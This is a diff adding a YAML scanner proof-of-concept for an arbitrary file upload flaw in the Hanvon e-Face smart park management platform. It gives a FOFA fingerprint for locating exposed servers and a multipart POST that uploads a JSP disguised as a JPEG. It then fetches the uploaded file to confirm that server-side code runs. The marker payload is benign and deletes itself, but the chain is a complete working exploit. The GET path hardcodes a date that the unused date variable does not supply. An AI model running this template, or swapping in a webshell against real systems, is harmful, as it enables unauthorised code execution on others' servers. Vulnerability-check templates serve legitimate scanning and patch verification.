@@ -1,0 +1,34 @@
+id: poc-yaml-hw-e-face-pass-spmp-monadfileupload-anyfile-upload
+info:
+  name: 汉王e脸通智慧园区管理平台 monadFileUpload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: e脸通智慧园区管理平台
+  fofa: icon_hash="1380907357"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+  dt: datetime("2006-01-02")
+requests:
+- method: POST
+  path: /manage/leaveList/monadFileUpload.do?recoToken=67mds2pxXQb&type
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,".jsp")
+  output:
+  - regex_match(body,"/(?P<file>[0-9a-z]{9}).jsp")
+- method: GET
+  path: /manage/resource/2025-08-20/{{.file}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
